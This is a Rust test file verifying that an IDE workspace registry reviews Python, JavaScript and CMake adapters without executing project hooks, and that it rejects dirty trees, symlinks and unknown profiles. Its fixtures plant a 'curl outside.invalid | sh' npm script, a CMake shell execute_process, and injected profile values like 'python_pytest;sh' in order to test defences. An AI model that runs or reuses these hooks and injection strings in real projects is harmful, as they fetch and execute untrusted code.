use lu_ide_workspace::{IdeError, IdeWorkspaceRegistry, NativeDirectoryPicker};
use std::{fs, path::{Path, PathBuf}};

struct Picker(Option<PathBuf>);
impl NativeDirectoryPicker for Picker {
    fn choose_project_directory(&mut self) -> Result<Option<PathBuf>, IdeError> {
        Ok(self.0.take())
    }
}
fn commit_tree(path: &Path) {
    let repo = if let Ok(existing) = git2::Repository::open(path) {
        existing
    } else {
        git2::Repository::init(path).unwrap()
    };
    let mut index=repo.index().unwrap();
    index.add_all(["*"].iter(),git2::IndexAddOption::DEFAULT,None).unwrap();
    index.write().unwrap();
    let oid=index.write_tree().unwrap();
    let tree=repo.find_tree(oid).unwrap();
    let signature=git2::Signature::now("Local IDE Fixture","ide@example.invalid").unwrap();
    let previous=repo.head().ok().and_then(|head|head.target())
        .and_then(|oid|repo.find_commit(oid).ok());
    let parents:Vec<_>=previous.iter().collect();
    repo.commit(Some("HEAD"),&signature,&signature,"fixture",&tree,&parents).unwrap();
}
fn fixture() -> (PathBuf, IdeWorkspaceRegistry, String) {
    let root=std::env::temp_dir().join(format!(
        "lu-ide-adapter-review-{}-{:016x}",
        std::process::id(),rand::random::<u64>(),
    ));
    let project=root.join("project");
    fs::create_dir_all(&project).unwrap();
    fs::write(project.join("pyproject.toml"),
        b"[build-system]\nrequires=[]\n# never evaluate a project hook\n").unwrap();
    fs::write(project.join("package.json"),
        br#"{"scripts":{"test":"curl outside.invalid | sh","pretest":"echo BAD"}}"#).unwrap();
    fs::write(project.join("CMakeLists.txt"),
        b"cmake_minimum_required(VERSION 3.21)\nexecute_process(COMMAND sh -c bad)\n").unwrap();
    commit_tree(&project);
    let registry=IdeWorkspaceRegistry::open(root.join("catalog.json")).unwrap();
    let id=registry.register_from_native_picker(&mut Picker(Some(project)))
        .unwrap().unwrap().project_id;
    (root,registry,id)
}
fn observe(registry: &IdeWorkspaceRegistry,id: &str,profile:&str,path:&str)
    -> lu_ide_workspace::reviewed_adapters::ReviewedAdapterContract
{
    let rev=registry.preview_source_file(id,path).unwrap().revision;
    registry.review_multilang_adapter(id,profile,&rev).unwrap()
}
#[test]
fn real_native_host_reviews_all_three_without_running_any_project_script() {
    let (root,registry,id)=fixture();
    for (profile,path,count) in [
        ("python_pytest","pyproject.toml",1),
        ("js_tests","package.json",1),
        ("cpp_cmake_build","CMakeLists.txt",3),
    ] {
        let result=observe(&registry,&id,profile,path);
        assert_eq!(result.profile_id,profile);
        assert_eq!(result.project_id,id);
        assert_eq!(result.manifest_relative_path,path);
        assert_eq!(result.observed_clean_git_head.len(),40);
        assert_eq!(result.review_fingerprint.len(),64);
        assert_eq!(result.steps.len(),count);
        assert_eq!(result.required_guards.len(),8);
        assert_eq!(result.snapshot_state,"not_sealed");
        assert_eq!(result.toolchain_state,"not_pinned_or_installed");
        assert_eq!(result.native_worker_state,"no_reviewed_platform_adapter");
        assert!(!result.execution_authorized);
        assert!(!result.command_dispatched);
        assert!(!result.source_text_exported);
        assert!(!result.installed_app_accepted);
        let serialized=serde_json::to_string(&result).unwrap();
        assert!(!serialized.contains("curl outside.invalid"));
        assert!(!serialized.contains("execute_process(COMMAND"));
        assert!(!serialized.contains(root.to_str().unwrap()));
        assert!(!serialized.contains("ide@example.invalid"));
    }
    fs::remove_dir_all(root).unwrap();
}
#[test]
fn manifest_revision_is_explicit_compare_and_swap() {
    let(root,registry,id)=fixture();
    let good=registry.preview_source_file(&id,"pyproject.toml").unwrap().revision;
    assert_eq!(registry.review_multilang_adapter(&id,"python_pytest",
        &"a".repeat(64)).unwrap_err(),"DEV03_ADAPTER_SOURCE_CHANGED");
    assert_eq!(registry.review_multilang_adapter(&id,"python_pytest",
        "not_a_sha").unwrap_err(),"DEV03_ADAPTER_INVALID_REVISION");
    let before=registry.review_multilang_adapter(&id,"python_pytest",&good).unwrap();
    let repeat=registry.review_multilang_adapter(&id,"python_pytest",&good).unwrap();
    assert_eq!(before.review_fingerprint,repeat.review_fingerprint);
    fs::remove_dir_all(root).unwrap();
}
#[test]
fn dirty_or_replaced_source_denied_before_any_adapter_plan() {
    let(root,registry,id)=fixture();
    let good=registry.preview_source_file(&id,"package.json").unwrap().revision;
    fs::write(root.join("project/package.json"),b"{\"scripts\":{\"test\":\"changed\"}}").unwrap();
    assert_eq!(registry.review_multilang_adapter(&id,"js_tests",&good).unwrap_err(),
        "DEV03_ADAPTER_REQUIRES_CLEAN_GIT_HEAD");
    fs::write(root.join("project/new-untracked.txt"),b"source not in HEAD").unwrap();
    assert_eq!(registry.review_multilang_adapter(&id,"js_tests",&good).unwrap_err(),
        "DEV03_ADAPTER_REQUIRES_CLEAN_GIT_HEAD");
    fs::remove_dir_all(root).unwrap();
}
#[test]
fn unknown_profile_arbitrary_command_and_foreign_project_denied() {
    let(root,registry,id)=fixture();
    let rev=registry.preview_source_file(&id,"package.json").unwrap().revision;
    for profile in ["rust_build","node -e process.exit(0)","../../outside",
        "npm_test","", "python_pytest;sh"] {
        assert_eq!(registry.review_multilang_adapter(&id,profile,&rev).unwrap_err(),
            "DEV03_ADAPTER_NOT_REVIEWED");
    }
    assert_eq!(registry.review_multilang_adapter(
        "ide-ffffffffffffffffffffffffffffffff","js_tests",&rev).unwrap_err(),
        "DEV03_ADAPTER_PROJECT_UNAVAILABLE");
    registry.close(&id).unwrap();
    assert_eq!(registry.review_multilang_adapter(&id,"js_tests",&rev).unwrap_err(),
        "DEV03_ADAPTER_PROJECT_UNAVAILABLE");
    fs::remove_dir_all(root).unwrap();
}
#[test]
fn missing_and_oversized_manifests_fail_closed() {
    let(root,registry,id)=fixture();
    let py=registry.preview_source_file(&id,"pyproject.toml").unwrap().revision;
    fs::remove_file(root.join("project/pyproject.toml")).unwrap();
    commit_tree(&root.join("project"));
    assert_eq!(registry.review_multilang_adapter(&id,"python_pytest",&py).unwrap_err(),
        "DEV03_ADAPTER_MANIFEST_UNAVAILABLE");
    fs::write(root.join("project/pyproject.toml"),vec![b'x';600*1024]).unwrap();
    commit_tree(&root.join("project"));
    assert_eq!(registry.review_multilang_adapter(&id,"python_pytest",&py).unwrap_err(),
        "DEV03_ADAPTER_MANIFEST_UNAVAILABLE");
    fs::remove_dir_all(root).unwrap();
}
#[cfg(unix)]
#[test]
fn committed_manifest_symlink_is_rejected_by_capability_browser() {
    use std::os::unix::fs::symlink;
    let(root,registry,id)=fixture();
    let js=registry.preview_source_file(&id,"package.json").unwrap().revision;
    let outside=root.join("private.json");
    fs::write(&outside,b"outside secret").unwrap();
    fs::remove_file(root.join("project/package.json")).unwrap();
    symlink(&outside,root.join("project/package.json")).unwrap();
    commit_tree(&root.join("project"));
    assert_eq!(registry.review_multilang_adapter(&id,"js_tests",&js).unwrap_err(),
        "DEV03_ADAPTER_MANIFEST_UNAVAILABLE");
    fs::remove_dir_all(root).unwrap();
}
